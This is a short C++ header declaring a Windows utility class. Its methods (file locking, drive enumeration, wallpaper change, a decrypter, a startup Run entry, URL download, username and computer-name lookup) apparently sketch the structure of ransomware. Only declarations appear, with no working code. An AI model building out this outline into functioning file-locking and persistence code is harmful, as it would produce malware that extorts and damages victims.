#pragma once

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <Lmcons.h>
#include <iomanip>
#include <commdlg.h>

class GeneralOperations {
	public:
		static std::string FetchDataFromURL(std::string url, std::string& file, int port, std::string requestType);
		static void DownloadData(std::string url, std::string file, int port, std::string requestType, std::string fileDestination);
		static std::string ComputerName();
		static std::string Username();
		static void LockFiles();
		static void GetHardDiskDrivesNames(std::vector<std::string>& strIPAddresses);
		static void ChangeWallpeper();
		static void Decrypter();
		static void AddRun();
};